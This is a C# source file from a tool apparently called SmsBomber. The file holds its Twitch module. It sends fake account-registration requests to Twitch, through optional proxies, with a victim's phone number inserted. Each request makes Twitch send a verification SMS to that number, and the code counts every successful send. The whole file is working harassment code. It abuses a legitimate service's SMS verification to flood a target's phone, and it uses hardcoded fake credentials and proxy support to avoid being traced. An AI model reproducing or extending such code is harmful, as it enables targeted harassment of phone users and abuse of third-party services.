using Leaf.xNet;
using static SmsBomber.ReturnTypes;

namespace SmsBomber.SmsService.Sites
{
    internal class Twitch
    {
        public static ResponseSendSms SendSms()
        {
            using (var request = new HttpRequest())
            {
                if (!string.IsNullOrWhiteSpace(Globals.WorkingData.ProxyAdress)) { request.Proxy = ProxyClient.Parse(Globals.WorkingData.ProxyTypeLeaf, Globals.WorkingData.ProxyAdress); }
                try
                {
                    request.Post($"{DomainList.Twitch}/register?trusted_request=true", $"{{\"birthday\": {{\"day\": 15, \"month\": 6, \"year\": 1995}}, \"client_id\": \"kd1unb4b3q4t58fwlpcbzcbnm76a8fp\", \"include_verification_code\": true, \"password\": \"passtsSor@5363\", \"phone_number\": \"{Globals.WorkingData.PhoneNumber}\", \"username\": \"Dodiks5216\"}}", "application/json").ToString();
                }
                catch
                {
                    if (!request.HttpIsConnected() || (int)request.Response.StatusCode != 422)
                    {
                        return new ResponseSendSms { FailedConnected = !request.HttpIsConnected(), SuccessSend = false };
                    }
                }

                if (request.Response.ToString().Contains("via SMS soon"))
                {
                    Globals.WorkingStats.CountSendingSms++;
                    return new ResponseSendSms { SuccessSend = true };
                }
                return new ResponseSendSms { SuccessSend = false };
            }
        }
    }
}
